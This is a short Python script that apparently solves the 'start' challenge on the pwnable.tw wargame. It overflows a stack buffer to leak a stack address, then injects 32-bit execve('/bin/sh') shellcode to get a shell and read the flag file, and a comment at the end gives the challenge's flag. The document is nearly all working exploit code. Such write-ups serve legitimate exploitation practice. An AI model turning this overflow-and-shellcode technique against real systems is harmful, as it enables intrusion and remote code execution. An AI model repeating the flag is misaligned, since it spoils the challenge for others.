from pwn import *


# shellcode from exploit db, shellcraft.i386.linux.sh reach 44 bytes.
shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = "\x90" * 20 + p32(0x8048087)
sh = remote("chall.pwnable.tw", 10000)
sh.recvuntil(":")
sh.send(payload)
ret = u32(sh.recv(0x14)[0:4]) + 0x14
payload = "\x90" * 20 + p32(ret) + shellcode
sh.sendline(payload)
sh.sendline("cat /home/start/flag")
print(sh.recvline())

# FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
